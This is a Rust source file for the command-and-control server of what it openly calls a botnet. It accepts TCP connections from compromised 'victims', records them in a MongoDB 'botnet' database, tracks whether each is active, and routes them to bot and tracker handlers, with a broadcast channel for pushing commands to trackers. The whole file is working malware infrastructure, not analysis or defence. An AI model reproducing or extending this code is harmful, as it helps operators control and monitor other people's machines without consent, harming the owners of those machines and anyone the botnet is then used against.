mod tracker;
mod victim;
mod bot;

#[macro_use]
extern crate log;

use std::time::Duration;
use std::{thread, net::SocketAddr, env};
use tokio::net::{TcpListener, TcpStream};

use mongodb::{options::ClientOptions, Client, Collection};
use mongodb::bson::doc;

use tokio::sync::broadcast::{self, Receiver};
use victim::{VictimDb, Victim, VictimType};

#[tokio::main]
async fn main() {
    if env::var("RUST_LOG").is_err() {
        env::set_var("RUST_LOG", "debug");
    }
    env_logger::init();
    let listener = TcpListener::bind("192.168.0.12:9570").await.unwrap();
    let options = ClientOptions::parse("mongodb://127.0.0.1:27017/").await.unwrap();
    let client = Client::with_options(options).unwrap();
    let (tx, _) = broadcast::channel::<String>(16);

    info!("Server started");
    let tx1 = tx.clone();
    tokio::spawn(async move {
        // tx1.send("COMMAND".to_string()).expect("Mauvaise commande");
        // tx1.send("COMMAND".to_string()).unwrap();
        thread::sleep(Duration::from_secs(10));
    });
    loop {
        let (mut stream, addr) = listener.accept().await.unwrap();

        info!("Connection established");
        let client = client.clone();
        let tx = tx.clone();
        tokio::spawn(async move {
            let victims_collection = client.database("botnet").collection::<VictimDb>("victims");
            let victim = victim::check_connection(&mut stream, &addr).await;
            if let Some(victim) = victim {
                insert_victim_db(&victim, &addr, &victims_collection).await;
                let receiver = tx.subscribe();
                manage_victim(victim, &mut stream, &victims_collection, receiver).await;
            } else {
                info!("{} tried to establish a connection but failed the test", addr.ip().to_string());
            }
         });
    }
}

async fn manage_victim(victim: Victim, mut stream: &mut TcpStream, victims_collection: &Collection<VictimDb>, receiver: Receiver<String>) {
    match victim.victim_type {
        VictimType::Bot => {
            if let Err(err) = bot::manage_bot(&victim, &mut stream, &victims_collection).await {
                error!("Error while communicating with the bot: {}", err);
            }
        },
        VictimType::Tracker => {
            if let Err(err) = tracker::manage_tracker(&victim, stream, receiver).await {
                error!("Error while communicating with the tracker: {}", err);
            }
        }
    }
    victim.update_status(&victims_collection, false).await.ok();
}

async fn insert_victim_db(victim: &Victim, addr: &SocketAddr, victims_collection: &Collection<VictimDb>) {
    let filter = doc! { "ip": addr.ip().to_string() };
    let find_victim = victims_collection.find_one(filter, None).await;

    if let Err(err) = find_victim {
        error!("Error while trying to find a victim on the collection: {}", err);
        return;
    }
    let find_victim = find_victim.unwrap();
    if find_victim.is_none() {
        if let Err(err) = victims_collection.insert_one(VictimDb { ip: addr.ip().to_string(), victim_type: victim.victim_type, active: false }, None).await {
            error!("Failed to insert in the database : {}", err);
        } else {
            info!("A new victim has been inserted in the database, ip: {}, mode: {}", addr.ip().to_string(), victim.victim_type);
        }
    } else {
        info!("An old victim connected to the server, ip: {} mode: {}", addr.ip().to_string(), victim.victim_type);
    }
    if let Err(err) = victim.update_status(&victims_collection, true).await {
        error!("Failed to update victim's active status to true: {}", err);
    }
}
